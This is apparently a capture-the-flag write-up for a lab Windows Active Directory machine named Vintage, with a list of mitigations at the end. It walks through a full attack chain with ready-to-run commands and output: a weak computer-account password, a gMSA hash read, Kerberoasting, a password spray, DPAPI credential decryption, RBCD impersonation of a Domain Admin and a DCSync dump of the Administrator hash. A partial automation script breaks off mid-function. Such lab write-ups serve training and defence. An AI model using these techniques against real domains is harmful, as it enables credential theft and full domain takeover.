## Executive Summary

Vintage is a Hard Windows Active Directory machine built around an assumed-breach scenario. In this environment, Active Directory Certificate Services (ADCS) is not installed, and NTLM authentication is disabled domain-wide. This forces all tool interactions to rely on Kerberos authentication. 

No single vulnerability grants immediate domain compromise. Instead, the path to full control involves chaining several misconfigurations and bad practices:
- The attack starts with initial assumed-breach credentials for a standard user.
- A pre-created computer account is discovered with a weak default password (equal to its username).
- A misconfigured Organizational Unit (OU) allows that computer account to disclose a Group Managed Service Account (gMSA) password.
- The gMSA hash is used to authenticate and add itself to a management group, which inherits full control over several service accounts.
- A disabled service account is re-enabled to perform targeted Kerberoasting, yielding a crackable hash.
- The cracked password is found to be reused by a standard user who has Remote Management access.
- A Data Protection API (DPAPI) credential blob is extracted from the user's profile and decrypted, revealing credentials for an admin-tier account.
- The admin account has rights to modify a delegated administration group that holds Resource-Based Constrained Delegation (RBCD) rights over the Domain Controller.
- The original computer account is added to the delegated group, allowing an RBCD attack to impersonate a Domain Admin.
- The forged ticket is used to extract the domain's Administrator hash via DCSync, leading to full domain compromise and code execution.

## Exploitation

### Foothold via Pre-Created Computer Account

The machine synopsis provided a hint: a pre-created computer account has a password equal to its `sAMAccountName`. We can test this directly against the `FS01$` account discovered during RID brute forcing.

```bash
kali@kali$ impacket-getTGT 'vintage.htb/fs01$':'fs01'
kali@kali$ export KRB5CCNAME=fs01\$.ccache
```

We successfully obtain a valid Ticket Granting Ticket (TGT) for `FS01$` using its own username as the password. This confirms the vulnerability and gives us access as the computer account.

### Reading the gMSA Managed Password

Group Managed Service Account (gMSA) passwords are automatically managed by the Domain Controller and are typically only readable by specific authorized computers. However, the `Domain Computers` Organizational Unit is misconfigured to allow any computer under it to read the `msDS-ManagedPassword` attribute. By default, `FS01$` is in this OU.

```bash
kali@kali$ bloodyAD -k --host dc01.vintage.htb -d vintage.htb -u 'FS01$' -p 'fs01' \
  get object 'gmsa01$' --attr msDS-ManagedPassword
msDS-ManagedPassword.NTLM: aad3b435b51404eeaad3b435b51404ee:b3a15bbdfb1c53238d4b50ea2c4d1178
```

<img src="assets/img/vintage/Got_gMSA_hash.png" alt="error loading image">

This successfully extracts the NTLM hash of the `gMSA01$` account.

## Privilege Escalation

### Privilege Escalation via ServiceManagers

With the gMSA hash, we can authenticate as `gMSA01$`.

```bash
kali@kali$ impacket-getTGT -hashes :b3a15bbdfb1c53238d4b50ea2c4d1178 'vintage.htb/gmsa01$'@dc01.vintage.htb
kali@kali$ export KRB5CCNAME=gmsa01\$@dc01.vintage.htb.ccache
```

Next, we leverage `gMSA01$` to add itself to the `ServiceManagers` group, which grants `GenericAll` (full control) over three service accounts: `svc_ldap`, `svc_ark`, and `svc_sql`.

```bash
kali@kali$ bloodyAD -k --host dc01.vintage.htb -d VINTAGE.HTB add groupMember 'SERVICEMANAGERS' 'GMSA01$'
[+] GMSA01$ added to SERVICEMANAGERS
```

We then request a fresh TGT so our cached ticket reflects the new group membership:

```bash
kali@kali$ impacket-getTGT -hashes :b3a15bbdfb1c53238d4b50ea2c4d1178 'vintage.htb/gmsa01$'@dc01.vintage.htb
```

### Targeted Kerberoasting

We attempt to Kerberoast the service accounts:

```bash
kali@kali$ python3 targetedKerberoast.py -k --no-pass -U users1.txt -d vintage.htb --dc-host dc01.vintage.htb
```

Initially, only `svc_ark` and `svc_ldap` return hashes because `svc_sql` is disabled, which is silently ignored by the tool. We can re-enable the account using the `GenericAll` right inherited from `ServiceManagers`:

```bash
kali@kali$ bloodyAD -k --host dc01.vintage.htb -d vintage.htb remove uac SVC_SQL -f ACCOUNTDISABLE
[-] ['ACCOUNTDISABLE'] property flags removed from SVC_SQL's userAccountControl
```

Re-running the Kerberoast now returns all three hashes.

### Password Spray & Lateral Movement

With a known password, we check for password reuse across the domain:

```bash
kali@kali$ nxc ldap vintage.htb -k -u 'P.Rosa' -p 'Rosaisbest123' --users-export domain_users.txt

kali@kali$ kerbrute_linux_amd64 --dc dc01.vintage.htb -d vintage.htb passwordspray domain_users.txt 'Zer0the0ne'
[+] VALID LOGIN:  C.Neri@vintage.htb:Zer0the0ne
[+] VALID LOGIN:  svc_sql@vintage.htb:Zer0the0ne
```

The user `C.Neri` reused the service account password. This user is part of `Remote Management Users`, granting WinRM access. Because NTLM is disabled, we must configure Kerberos locally and request a TGT before using `evil-winrm`.

```bash
# krb5.conf pointed at VINTAGE.HTB / dc01.vintage.htb
kali@kali$ impacket-getTGT vintage.htb/c.neri:Zer0the0ne
kali@kali$ export KRB5CCNAME=c.neri.ccache
kali@kali$ evil-winrm -i dc01.vintage.htb -r vintage.htb
```

This grants a shell where the user flag can be retrieved from `C:\Users\C.Neri\Desktop\user.txt`.

### DPAPI Credential Extraction

Windows Data Protection API (DPAPI) protects secrets like saved credentials. These are encrypted with a master key derived from the user's password. Because we have `C.Neri`'s password, we can decrypt their DPAPI blobs.

While exploring `C.Neri`'s profile, a credential blob is found and downloaded:

```powershell
*Evil-WinRM* PS C:\Users\C.Neri> download C4BB96844A5C9DD45D5B6A9859252BA6
```

The associated master key is also downloaded from `C:\Users\C.Neri\AppData\Roaming\Microsoft\Protect\<SID>\99cf41a3-a552-4cf7-a8d7-aca2d6f7339b`. The user SID is obtained via PowerShell:

```powershell
*Evil-WinRM* PS C:\Users\C.Neri> (Get-ADUser C.Neri).Sid.Value
# S-1-5-21-4024337825-2033394866-2055507597-1115
```

We decrypt the master key and the credential blob:

```bash
kali@kali$ impacket-dpapi masterkey -sid S-1-5-21-4024337825-2033394866-2055507597-1115 \
  -password 'Zer0the0ne' -file 99cf41a3-a552-4cf7-a8d7-aca2d6f7339b

kali@kali$ impacket-dpapi credential -file C4BB96844A5C9DD45D5B6A9859252BA6 -key <decrypted_masterkey>
Username    : vintage\c.neri_adm
Unknown     : Uncr4ck4bl3P4ssW0rd0312
```

This yields credentials for the admin-tier account `c.neri_adm`.

### RBCD Abuse via DelegatedAdmins

BloodHound revealed that `c.neri_adm` has `GenericWrite` and `AddSelf` rights over the `DelegatedAdmins` group. This group has `AllowedToAct` Resource-Based Constrained Delegation (RBCD) rights on the Domain Controller (`DC01$`).

To perform the RBCD attack, the account added to `DelegatedAdmins` must have a Service Principal Name (SPN). `FS01$` is already a computer account with a default SPN, making it a perfect fit.

<img src="assets/img/vintage/Got_evil_rim.png" alt="error loading image">

We add `FS01$` to `DelegatedAdmins`:

```bash
kali@kali$ bloodyAD -k --host dc01.vintage.htb -d VINTAGE.HTB -u C.Neri_ADM -p 'Uncr4ck4bl3P4ssW0rd0312' \
  add groupMember "DELEGATEDADMINS" 'fs01$'
[+] fs01$ added to DELEGATEDADMINS
```

Next, we use `FS01$` to impersonate the Domain Admin `L.BIANCHI_ADM` via S4U2Self and S4U2Proxy extensions:

```bash
kali@kali$ impacket-getST -impersonate L.BIANCHI_ADM -spn host/dc01.vintage.htb 'vintage.htb/fs01$:fs01'
kali@kali$ export KRB5CCNAME=L.BIANCHI_ADM@host_dc01.vintage.htb@VINTAGE.HTB.ccache
```

### DCSync and Root Flag

With the forged service ticket impersonating a Domain Admin, we execute a DCSync attack to dump the Administrator hash directly from the Domain Controller:

```bash
kali@kali$ impacket-secretsdump -k -no-pass dc01.vintage.htb
Administrator:500:aad3b435b51404eeaad3b435b51404ee:468c7497513f8243b59980f2240a10de:::
```

<img src="assets/img/vintage/Got_administrator_hash.png" alt="error loading image">

The built-in Administrator account is restricted from network logons. However, we can use our service ticket for `L.BIANCHI_ADM` to gain code execution:

```bash
kali@kali$ wmiexec.py -k -no-pass L.BIANCHI_ADM@dc01.vintage.htb -dc-ip 10.129.231.205
```

Alternatively, to spawn an Evil-WinRM session, we request an HTTP service ticket:

```bash
kali@kali$ impacket-getST -dc-ip 10.129.231.205 -spn 'HTTP/dc01.vintage.htb' \
  -impersonate L.BIANCHI_ADM -k 'vintage.htb/fs01$:fs01'
kali@kali$ export KRB5CCNAME=L.BIANCHI_ADM@HTTP_dc01.vintage.htb@VINTAGE.HTB.ccache
kali@kali$ evil-winrm -i dc01.vintage.htb -r vintage.htb
```

The root flag is successfully retrieved from `C:\Users\Administrator\Desktop\root.txt`.

### Issues Encountered & Resolutions

This section documents troubleshooting steps taken during the engagement, many of which stem from the NTLM-disabled configuration and a live cleanup script running on the target.

- **Clock Skew (`KRB_AP_ERR_SKEW`):** Kerberos operations failed after a while because of a ~3.5-minute time drift. A time sync via `sudo ntpdate dc01.vintage.htb` was necessary and had to be run periodically.
- **Connectivity Failures:** Initial scripts pointed to an old IP (`10.10.11.45`), causing routing errors. Updating the IP to `10.129.231.205` and ensuring DNS resolution resolved this.
- **NTLM Disabled Domain-Wide:** Many tools defaulted to NTLM pass-the-hash and failed. The solution was forcing Kerberos (`-k`) and using `ccache` tickets everywhere.
- **Administrator Network Logon Restrictions:** Obtaining the Administrator hash was not enough because the account was restricted from network logons. We bypassed this by impersonating `L.BIANCHI_ADM` (a Domain Admin) instead.
- **`KDC_ERR_BADOPTION` on S4U2Proxy:** A background cleanup script on the target regularly reverted group memberships and SPN modifications. Performing manual steps left enough time for the script to ruin the RBCD chain. This required automating the attack into a single bash script.
- **Tool Errors:** `bloodyAD` crashed due to inconsistent flags, requiring strict adherence to its documented syntax. Attempts to bypass it with `ldapmodify` failed due to local Kerberos config issues. `RunasCs.exe` failed due to .NET mismatches, so native Windows commands via Evil-WinRM were used instead.
- **SMB Timeouts:** Transferring large files with `smbclient`'s `mget` caused timeouts, meaning files had to be downloaded one by one.

### Automation Script

Given the issues with the cleanup script reverting state mid-attack, the entire RBCD chain was automated into a single uninterrupted sequence.

#### Final / Refined Version (Succeeded End-to-End)

Uses the correct target IP throughout, adds `P.Rosa` to `SERVICEMANAGERS` instead of relying solely on `GMSA01$`, and scopes the final `secretsdump.py` call with `-just-dc-user administrator`.

```bash
#!/bin/bash

# Define colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

DC_IP="10.129.231.205"

print_header() {
    echo -e "${YELLOW}======================================================================${NC}"
    echo -e "${YELLOW}$1${NC}"
    echo -e "${YELLOW}======================================================================${NC}"
}

print_success() {
    echo -e "${GREEN}[+] Success: $1${NC}"
}

print_error() {
    echo -e "${RED}[-] Error: $1${NC}"
    exit 1
```

## Mitigations

To secure this environment against similar attack paths, the following measures are recommended:

- **Secure Pre-created Accounts:** Randomize and rotate computer account passwords immediately after provisioning instead of using predictable defaults like the username.
- **Restrict gMSA Password Reads:** Audit the `Domain Computers` OU and restrict `msDS-ManagedPassword` read rights so that only authorized principals can extract gMSA passwords.
- **Limit Generic Rights:** Scope group-based rights tightly. Avoid broad `GenericAll` grants on sensitive groups like `ServiceManagers`.
- **Protect Disabled Accounts:** Ensure strict access control over `userAccountControl` and SPNs on sensitive accounts, even when they are disabled, to prevent attackers from re-enabling them for Kerberoasting.
- **Enforce Strong Passwords:** Apply and enforce a strict password policy across all service accounts to mitigate Kerberoasting attacks.
- **Prevent Password Reuse:** Educate users against reusing passwords across different accounts, especially between service accounts and standard user accounts. Implement monitoring for password spray attempts.
- **Avoid DPAPI Secrets for Admins:** Avoid storing privileged or admin-tier credentials in Windows Credential Manager to prevent extraction via compromised standard user profiles.
- **Audit Delegation Rights:** Restrict ACLs on groups like `DelegatedAdmins` that possess delegation rights. Ensure only highly trusted tier-0 accounts can modify their memberships.
- **Protect RBCD Privileges:** Treat any principal or group holding Resource-Based Constrained Delegation (`AllowedToActOnBehalfOfOtherIdentity`) rights over a Domain Controller as a Tier-0 asset.
- **Restrict DCSync Capabilities:** Limit DCSync rights to only essential accounts and establish monitoring for suspicious `DRSGetNCChanges` network calls.
- **Apply Consistent Logon Restrictions:** Ensure that logon restrictions applied to built-in accounts like Administrator are consistently applied across all privileged Domain Admin accounts.
